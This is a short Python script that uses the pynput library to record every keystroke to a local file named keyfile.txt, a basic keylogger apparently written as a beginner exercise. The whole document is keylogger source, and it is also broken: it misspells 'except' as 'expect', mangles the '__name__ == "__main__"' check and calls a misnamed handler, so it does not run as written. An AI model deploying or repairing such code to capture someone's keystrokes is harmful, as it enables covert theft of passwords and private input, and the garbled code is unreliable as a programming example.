from pynput import keyboard 

def KeyPressed(key):
    print(str(key))
    with open("keyfile.txt", 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        expect:
            print("Error getting char")

if_name_== "_main_"
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()
